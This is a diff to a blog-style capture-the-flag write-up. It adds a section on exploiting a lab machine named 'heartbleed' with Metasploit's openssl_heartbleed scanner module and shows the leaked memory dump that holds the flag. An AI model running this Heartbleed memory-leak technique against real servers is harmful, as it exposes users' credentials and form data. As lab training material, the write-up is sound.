@@ -411,7 +411,29 @@ __init_array_end
 
 However, I could not find anything that looked like a flag in the file's strings. I decided to take things a bit further and open up the NSA's reverse engineering tool Ghidra and decompile the binary to see what is really happening.
 
-![Ghidra Decompiler]({{ '/assets/images/hackback-2019/hackback-2019-ghidra.jpeg' | relative_url }}){: .center-image }*Ghidra decompiler showing a decompiled version of the program*
+![Ghidra Decompiler]({{ '/assets/images/hackback-2019/hackback-2019-ghidra.jpeg' | relative_url }}){: .center-image }*Ghidra decompiler showing a C version of the program*
 
 This shows us a case statement spelling out "THMRANDENC" which looks like a potential flag, which was indeed correct.
 
+# Task 7: Protecting Data In Transit [Web Exploitation] [Easy]
+
+Given that the name of this machine is "heartbleed" and there are a multiple heartbleed references in the webpage, what we need to do here is pretty obvious. I used metasploit and it's "auxiliary/scanner/ssl/openssl_heartbleed" module.
+
+We need to set the "RHOSTS" variable to the machine's ip and "verbose" to true to read the memory contents.
+
+As this CTF does not have a strict flag format, we will have to manually look through the dumped data. Given multiple previous flags have had "THM" (Try Hack Me) in it, it's likely to contain that.
+
+>Heartbleed Data
+{:.filename}
+{% highlight text %}
+[*] 10.0.0.143:443        - Printable info leaked:
+......\.<.h......4...6'.3....e...B(N....f.....".!.9.8.........5.............................3.2.....E.D
+...../...A.......................................(KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36.
+.Content-Length: 75..Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=
+haxor@haxor.com&user_message=*THM{sSl-Is-BaD}*.!.}..+.....i.........................................
+............................................................................................ repeated 
+15755 times
+{% endhighlight  %}
+
+
+It took a few runs but I eventually identified the flag "THM{sSl-Is-BaD}".
